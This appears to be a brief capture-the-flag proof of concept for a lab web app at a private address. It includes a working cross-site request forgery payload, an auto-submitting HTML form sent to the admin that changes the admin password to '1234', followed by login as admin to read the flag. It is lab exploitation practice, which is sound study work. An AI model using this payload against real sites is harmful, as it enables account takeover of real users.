# POC

- in browser open `http://10.0.2.10`
- register and read admin messages
- send message to admin
```html
<form action="http://10.0.2.10/user/settings" method="POST">
  <input type="hidden" name="password" value="1234" />
  <input type="hidden" name="cpassword" value="1234" />
</form>
<script>document.forms[0].submit();</script>
```

- wait & check login as admin with password `1234`
- go to admin panel and see the flag in flag tab

